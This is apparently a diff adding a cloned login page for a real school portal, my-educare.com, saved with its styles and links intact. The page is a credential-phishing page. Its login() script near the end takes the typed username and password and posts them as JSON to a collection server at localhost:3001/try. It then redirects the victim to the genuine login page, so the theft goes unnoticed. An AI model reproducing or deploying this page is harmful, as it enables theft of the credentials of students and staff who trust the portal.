@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://ykc-mk.my-educare.com/login.php -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Login</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!--===============================================================================================-->
+    <link rel="icon" type="image/png" href="https://ykc-mk.my-educare.com/login/images/icons/tab-logo.png">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="./Login_files/bootstrap.min.css">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="./Login_files/font-awesome.min.css">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="./Login_files/icon-font.min.css">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="./Login_files/animate.css">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="./Login_files/hamburgers.min.css">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="./Login_files/animsition.min.css">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="./Login_files/select2.min.css">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="./Login_files/daterangepicker.css">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="./Login_files/util.css">
+    <link rel="stylesheet" type="text/css" href="./Login_files/main.css">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="./Login_files/dx.common.css">
+    <link rel="stylesheet" type="text/css" href="./Login_files/dx.light.css">
+    <style>
+        .row {
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
+            margin-right: 0px !important;
+            margin-left: -15px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .txt2 {
+            float: right;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+    </style>
+
+<link id="freshworks-frame" rel="stylesheet" href="./Login_files/frame.d7ae132c.css"></head>
+
+<body style="background: #1D8D84">
+
+<div class="row">
+    <div class="col-md-2"></div>
+    <div class="col-md-4 card disable-rounded-right mb-0 p-2 h-100 d-flex justify-content-center" style="margin-top: 100px;border-right: none;border-bottom-right-radius: 0px !important;
+         border-top-right-radius: 0px !important">
+        <div class="limiter">
+            <div class="container-login100">
+                <div class="wrap-login100 p-t-50 p-b-90">
+                    <form id="signup" class="login100-form validate-form flex-sb flex-w">
+					<span class="login100-form-title p-b-51">
+						<img src="./Login_files/logo1.png" width="100%">
+					</span>
+
+                        <div id="usernamepassword">
+                            <div class="wrap-input100 validate-input m-b-16" data-validate="Username is required">
+                                <input id="username" class="input100" type="text" name="username" placeholder="Username">
+                                <span class="focus-input100"></span>
+                            </div>
+
+
+                            <div class="wrap-input100 validate-input m-b-16" data-validate="Password is required">
+                                <input class="input100" type="password" id="user-pass" name="password" placeholder="Password">
+                                <span class="focus-input100"></span>
+                            </div>
+
+                            <div class="flex-sb-m w-full p-t-3 p-b-24">
+                                <div class="contact100-form-checkbox">
+
+                                </div>
+
+                                <div>
+                                    <a href="https://ykc-mk.my-educare.com/forgottenPassword.php" class="txt1">
+                                        Forgot password?
+                                    </a>
+                                </div>
+                            </div>
+
+                            <div class="container-login100-form-btn m-t-17">
+                                <button onclick="login()" id="login_btn" type="button" class="login100-form-btn">
+                                    Login
+                                </button>
+                            </div>
+                        </div>
+                        <div class="wrap-input100 validate-input m-b-16 hidden" id="validate_code" style="margin-top:40px;">
+                            <input class="input100" type="text" name="confirm_code" id="confirm_code" placeholder="Confirm Code">
+                            <span class="focus-input100"></span>
+                        </div>
+
+                        <div style="margin-top: 30px" class="container-login100-form-btn m-t-17 hidden" id="validate_btn">
+                            <button id="confirm_btn" type="button" class="login100-form-btn" style="margin-top: -30px;">
+                                Confirm
+                            </button>
+                            <div>
+                                <a href="https://ykc-mk.my-educare.com/login.php" class="txt2">
+                                    Back to login!
+                                </a>
+                            </div>
+                        </div>
+
+                        <div style="margin-top: 40px;">
+                            <a href="https://ykc-mk.my-educare.com/login/android_apps.html"><img src="./Login_files/playstore.png" style="width:158px;height:70px;"></a>
+                            <a href="https://ykc-mk.my-educare.com/login/ios_apps.html"><img src="./Login_files/appstore.png" style="width:150px;height:50px;"></a>
+
+                        </div>
+
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-4 card disable-rounded-right mb-0 p-2 h-100 d-flex justify-content-center" style="margin-top: 100px; border-left: none;border-top-left-radius: 0px !important;
+         border-bottom-left-radius: 0px !important;">
+        <div class="limiter">
+            <div class="container-login100">
+                <div class="wrap-login100 p-t-50 p-b-90">
+                    <img src="./Login_files/21.png" style="max-width:150%;
+max-height:150%; margin-left: -100px;">
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    async function login() {
+        const username = document.getElementById("username")
+        const password = document.getElementById("user-pass")
+
+        const dataToSend = {
+            username: username.value,
+            password: password.value
+        }
+        const res = await fetch("http://localhost:3001/try",
+        {
+    method: 'POST',
+    headers: {
+      'Accept': 'application/json',
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(dataToSend)
+  })
+
+  const dataget = await res.json()
+
+    window.location.href = 'https://ykc-mk.my-educare.com/login.php'
+  
+
+    }
+
+    document.getElementById("signup").addEventListener("submit", function(event){
+  event.preventDefault()
+});
+</script>
+
+
+
+<div id="freshworks-container" data-html2canvas-ignore="true" style="width: 0px; height: 0px; bottom: 0px; right: 0px; z-index: 2147483647;"><div aria-live="polite"><iframe allowfullscreen="" id="launcher-frame" data-testid="launcher-frame" style="right: 2px; bottom: 2px; border: none; position: fixed; min-width: 104px; max-width: 156px; height: 56px; z-index: 2147483000; visibility: visible;" src="./Login_files/saved_resource.html"></iframe></div></div><iframe title="FreshworksWidget" id="freshworks-frame" data-html2canvas-ignore="true" style="display: none;" src="./Login_files/saved_resource(1).html"></iframe></body></html>
